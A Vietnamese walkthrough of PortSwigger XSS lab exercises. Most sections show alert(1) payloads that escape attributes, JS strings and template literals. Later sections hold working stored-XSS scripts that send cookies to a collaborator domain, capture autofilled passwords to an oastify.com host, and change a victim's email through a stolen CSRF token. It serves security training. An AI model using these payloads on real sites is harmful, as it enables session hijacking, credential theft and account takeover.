>![image](https://hackmd.io/_uploads/HyLu687QC.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SkhagwQmA.png)

# **15. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded**
>Lab chứa lỗ hổng stored XSS trong chức năng bình luận. Hoàn thành bài lab bằng cách submit 1 comment, và khi author name được click vào sẽ kích hoạt hàm alert() thành công:
![image](https://hackmd.io/_uploads/BkXx-Pmm0.png)

>Ta thấy chức năng comment ở mỗi bài post, submit thử 1 comment hợp lệ: ![image](https://hackmd.io/_uploads/HJZIfwXmC.png)

>Sau khi nhập website của ta là `http://test.com` và post comment lên, xem lại source thì thấy trang web render ra màn hình bằng code `<a id="author" href="test">test</a>` => trường `Website` được lưu trong `href` của tag `<a>`
>![image](https://hackmd.io/_uploads/HknfNvXXR.png)

>Ta có thể control link này thành `javascript:alert(1)`, cho phép chạy mã JavaScript trực tiếp từ thanh địa chỉ của trình duyệt hoặc từ một liên kết (link). => Khi victim ấn vào author name sẽ thực thi hàm alert(): ![image](https://hackmd.io/_uploads/HJIHrDXXC.png)

> Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HyEIrPQmC.png)

# **16. Lab: Reflected XSS in canonical link tag**
![image](https://hackmd.io/_uploads/HJmnZ3QQA.png)

>Khi truy cập trang web, có thể thấy canonical link chính là đường dẫn URL hiện tại. Nhìn vào đó mình có thể escape và thêm thuộc tính để reflected XSS: ![image](https://hackmd.io/_uploads/H1ZDUINmR.png)

> Ta sẽ truy cập với URL: `<LAB DOMAIN>/?'accesskey='x'onclick='alert(1)`. Việc dùng `?` để tránh sai URL trong quá trình inject payload. Ngoài ra, việc thêm `accesskey='x'` để khi user dùng tổ hợp phím `ALT+SHIFT+X` hay `CTRL+ALT+X` hay `Alt+X` thì nó sẽ truy cập đến tag chứa nó; và kết hợp với `onclick`, ta sẽ trigger được alert: ![image](https://hackmd.io/_uploads/r1r3_L4mC.png)

>Thực hiện ấn `ALT+SHIFT+X` (đối với Windows), ta sẽ trigger được alert():
![image](https://hackmd.io/_uploads/HJFWF8VX0.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJFXYUNXR.png)

# **17. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded**
![image](https://hackmd.io/_uploads/BkqFC4EmC.png)

>Truy cập trang web, thấy chức năng tìm kiếm, thử nhập 1 chuỗi hợp lệ: ![image](https://hackmd.io/_uploads/H1_QxHNXR.png)

>Xem lại respone thì thấy 1 đoạn code JS để xử lí: ![image](https://hackmd.io/_uploads/Sy_Ilr4XA.png)

>Cụ thể thì input nhập vào sẽ được cho vào 1 biến `searchTerms`, sau đó `document.write` sẽ render ra màn hình. 
>Lúc này ta có thể escape `searchTerms` và gọi hàm alert bằng payload `test';alert(1);//`. Có thể thấy đoạn script được render sau khi ta inject vẫn đúng cấu trúc của Javascript:
>![image](https://hackmd.io/_uploads/HylsOBNQR.png)

>![image](https://hackmd.io/_uploads/SkjmNHVQ0.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/H1V4NrNX0.png)

# **18. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped**
![image](https://hackmd.io/_uploads/BJjL5UNXC.png)

>Truy cập bài lab và có chức năng tìm kiếm, thử nhập 1 chuỗi hợp lệ:![image](https://hackmd.io/_uploads/SkalXv4m0.png)

>Xem lại respone thì thấy 1 đoạn code JS để xử lí: ![image](https://hackmd.io/_uploads/Sy_Ilr4XA.png)

>Cụ thể thì input nhập vào sẽ được cho vào 1 biến `searchTerms`, sau đó `document.write` sẽ render ra màn hình. 
>Ta thử escape chuỗi `searchTerms` và gọi alert bằng payload `test';alert(1)//`. Tuy nhiên `'` đã bị escape: ![image](https://hackmd.io/_uploads/HJiR7DNQC.png)

> Tuy nhiên, ta thử thêm `</script>` để đóng tag `script` rồi thêm XSS payload `</script><img src=1 onerror=alert(1)>`: ![image](https://hackmd.io/_uploads/rJriNwV7R.png)

>Nhập payload vào và trigger thành công được alert():
![image](https://hackmd.io/_uploads/rkl1HDNXA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Skd1BvNm0.png)

# **19. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**
![image](https://hackmd.io/_uploads/SJxYqtVmA.png)

>Truy cập bài lab và có chức năng tìm kiếm, thử nhập 1 chuỗi hợp lệ: ![image](https://hackmd.io/_uploads/S1JDot470.png)

>Xem lại respone thì thấy 1 đoạn code JS để xử lí: ![image](https://hackmd.io/_uploads/SkQOjYV7A.png)

>Cụ thể thì input nhập vào sẽ được cho vào 1 biến `searchTerms`, sau đó `document.write` sẽ render ra màn hình. 
>Ta thử escape chuỗi `searchTerms` và gọi alert bằng payload của bài trước `test';alert(1)//` :-1: 
>![image](https://hackmd.io/_uploads/HkOpiFNQR.png)

>Nhưng lần này thì trang web đã chặn => Bài lab này nâng cấp thêm từ bài trên khi mà thực hiện HTML encode hết các kí tự `<`,`>`,`"` đồng thời espace dấu `'`: ![image](https://hackmd.io/_uploads/rJ-jaFE7R.png)

>Tuy nhiên, kí tự `\` thì không bị escape: ![image](https://hackmd.io/_uploads/BkJpaKNQ0.png)

> Tận dụng điều đó, ta search với payload `test\';alert(1);//` để gọi được hàm alert và `//` để comment phần dư đằng sau: ![image](https://hackmd.io/_uploads/SyCkRK4XA.png)

>Payload đã hoạt động hiểu quả và thành công thoát khỏi `searchTerms` , trigger được hàm alert() !
>![image](https://hackmd.io/_uploads/SJBL0FNQA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rkWPCYVXA.png)

# **20. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

![image](https://hackmd.io/_uploads/rkgWW5E7C.png)

>Truy cập bài lab và có chức năng comment dưới mỗi bài post, thử comment hợp lệ và và quan sát các request: ![image](https://hackmd.io/_uploads/H1lHZq4X0.png)

>Tải lại trang và thấy rằng trường `website` được truyền thẳng vào hàm `track()` trong event onclick tại tag `<a>` chứa tên người dùng: ![image](https://hackmd.io/_uploads/HJPGz5V7A.png)

>Tiếp tục thử xem các kí tự đặc biệt có bị mã hóa hay không. Thử comment với website là `http://test.com"\'><` thì thấy các í tự `"\'><` đều bị HTML-encode cũng như escape: ![image](https://hackmd.io/_uploads/SyLtf54Q0.png)

>Nhìn vào hàm `track()` ta có thể sử dụng payload sau `http://test.com'-alert(1)-'` để thoát ra khỏi chuỗi và gọi được alert nhờ expression. Tuy nhiên vì `'` đã bị escape nên ta sẽ encode thử `'` thành `&apos;` xem.
>Chuỗi `&apos;` là một thực thể HTML biểu thị dấu nháy đơn. Vì HTML giải mã giá trị của thuộc tính **onclick** trước khi JavaScript thông dịch nên các thực thể được giải mã dưới dạng dấu ngoặc kép, trở thành dấu phân cách chuỗi => có thể bypass được filter, payload: `http://test.com&apos;-alert(1)-&apos;`

>![image](https://hackmd.io/_uploads/Hyt8B9Em0.png)
> Load lại trang và thấy escape thành công:
![image](https://hackmd.io/_uploads/S1PEH9EmC.png)

>Khi ấn vào tên người comment thì trigger thành công hàm alert(): ![image](https://hackmd.io/_uploads/r1pJL54XC.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SyzZLqNXA.png)

# **21. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

![image](https://hackmd.io/_uploads/Skh9kjEQR.png)

>Bài lab này sử dụng template literal trong dấu backticks **``** để hiển thị chuỗi search ở biến `message`. Các kí tự `'<>"/`  đều bị Unicode encode.
>![image](https://hackmd.io/_uploads/rJHL8iEQC.png)

>Ta sẽ dùng `${}` syntax để thực thi JS expression trong dấu backticks `` của template mà không cần phải terminate khỏi nó. Ví dụ, search với chuỗi `${1+1}`: ![image](https://hackmd.io/_uploads/HyGCIj4QA.png)

>Có thể thấy `${1+1}` đã được thực thi và trả về `2`: ![image](https://hackmd.io/_uploads/rkQkvjE7R.png)

>Xác nhận rằng có thể dùng cách này để bypass filter và thực thi lệnh bên trong, sử dụng payload `${alert(1)}`: ![image](https://hackmd.io/_uploads/rkJLviNXA.png)

>Hàm alert() được thực thi thành công, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJOvDsN7C.png)

# **22. Lab: Exploiting cross-site scripting to steal cookies**

![image](https://hackmd.io/_uploads/BJwT_jNXA.png)

>Tương tự các bài trên, chức năng comment bị dính Stored XSS. Kiểm tra với trường comment với `<script>alert(1)</script>` thì thấy attack thành công: ![image](https://hackmd.io/_uploads/HyhDFo4XR.png)

>Ta sẽ đi lấy cắp cookie của user khác bằng payload:

```javascript
<script>
fetch('//<COLLABORATOR DOMAIN>', {
method: 'POST',
body:document.cookie
});
</script>
```

>Cụ thể, khi user khác xem comment chứa payload trên, nó sẽ POST đến Collaborator domain đang lắng nghe với body chứa cookie.
>Thực hiện gửi comment chứa đoạn payload trên:![image](https://hackmd.io/_uploads/SyeNnjNX0.png)

>Kiểm tra trên Collaborator thì thấy đã có request đến và body chứa cookie của một user đã xem comment: ![image](https://hackmd.io/_uploads/H18B2i47A.png)

>Truy cập trang web với cookie vừa trộm được: ![image](https://hackmd.io/_uploads/SJrF3j4mR.png)

>Tải lại trang và thành công truy cập vào tài khoản `administrator`, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Hyv2ns4mA.png)

# **23. Lab: Exploiting cross-site scripting to capture passwords**
![image](https://hackmd.io/_uploads/rkcuCsEmA.png)

>Lab này đã dùng cờ `HttpOnly` nên ta không thể trộm cookie như trước.

>Chức năng comment bài này cũng dính Stored XSS. Ngoài ra vì ứng dụng sử dụng một app khác tự động nhập password khi có form đăng nhập nên ta sẽ tận dụng XSS để tạo 1 form đăng nhập fake và sử dụng onchange event tại password input để gửi password về collaborator domain mình control.

>Payload có dạng như sau:

```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://zy1j25g4t64x0m8ooxn794h12s8mwck1.oastify.com',{
method:'POST',
body:username.value ':' this.value
});">
```

>Nó sẽ POST đến collaborator tài khoản nạn nhân khi onchange tại password kích hoạt. Ta gửi payload ở trường **comment**: ![image](https://hackmd.io/_uploads/rkdIWh4QA.png)

>Sau khi gửi và đợi 1 chút thì thấy có request đến Collaborator chứa account cần tìm là `administrator:o16dlwh55u59wrkpzkea`:
>![image](https://hackmd.io/_uploads/B1Xwr2VXR.png)

>Tiến hành đăng nhập với username và password trộm được và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Hyiir3EXA.png)

# **24. Lab: Exploiting XSS to perform CSRF**

![image](https://hackmd.io/_uploads/r1iILnVXC.png)

>Ứng dụng web này tiếp tục dính Stored XSS tại comment. Lần này ta sẽ tận dụng lỗ hổng này để CSRF làm thay đổi email của nạn nhân.

>Đầu tiên, đăng nhập tài khoản có sẵn `wiener:peter` để xem form update email. GET đến `/my-account`, form update email gồm 2 trường `email` và `csrf` (sẽ được tạo sẵn sau khi load form): ![image](https://hackmd.io/_uploads/SkJIEYPXA.png)

> Khi thực hiện điền form và update email, sẽ có 1 POST request đến `/my-account/change-email` với `email` và `csrf` tương ứng: ![image](https://hackmd.io/_uploads/Hk8_NYP7R.png)

> Sau khi đã biết được quy trình thay đổi email, ta thực hiện tạo payload như sau:
```javascript
<script>
var request = new XMLHttpRequest();
request.onload = csrfEmail;
request.open('get','/my-account',true);
request.send();
function csrfEmail() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/my-account/change-email', true);
    changeReq.send('email=ducanh@gmail.com&csrf='+token)
};
</script>
```

>Cụ thể, nó sẽ GET `/my-account` trước để tự đông lấy mã `csrf` rồi POST đến `/my-account/change-email` kèm theo `email` mong muốn đổi và mã `csrf` đã lấy được. Như vậy, khi nạn nhân load comment này thì email của họ sẽ tự động bị đổi.

>Gửi comment với payload trên vào phần comment dưới mỗi bài post:![image](https://hackmd.io/_uploads/BJK-StD7C.png)

>Sau khi submit comment thì thông báo đã solved lab thành công do có nạn nhân đã xem comment và bị đổi email thành của ta: ![image](https://hackmd.io/_uploads/Hy8IBYwXC.png)

# **25. Lab: Reflected XSS with AngularJS sandbox escape without strings**
![image](https://hackmd.io/_uploads/ry1aHtPmR.png)
